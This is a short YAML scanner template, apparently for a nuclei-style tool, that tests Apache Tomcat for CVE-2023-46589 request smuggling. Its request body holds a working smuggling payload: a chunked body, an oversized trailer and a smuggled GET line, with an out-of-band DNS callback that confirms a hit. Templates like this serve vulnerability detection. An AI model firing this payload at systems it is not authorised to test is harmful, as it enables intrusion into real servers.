id: CVE-2023-46589

info:
  name: Apache Tomcat - Request Smuggling
  author: zan8in
  severity: high
  verified: false
  reference:
    - https://hackerone.com/reports/2280391
    - https://github.com/ir3shio/nuclei/blob/e9cb41056444f8ba4f04fff285d1dafedb09f3bc/cve/CVE-2023-46589.yaml
  tags: cve,cve2023,tomcat,smuggling
  created: 2024/02/02

set:
  payload: repeat("a",8179)
  oob: oob()
  oobDNS: oob.DNS
rules:
  r0:
    request:
      method: POST
      path: /examples/test.jsp
      body: |-
        5
        foo=b
        2
        ar
        0
        testtrailer: {{payload}}
        a: GET /examples/?this_is_attack HTTP/1.1
        Host: {{oobDNS}}
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
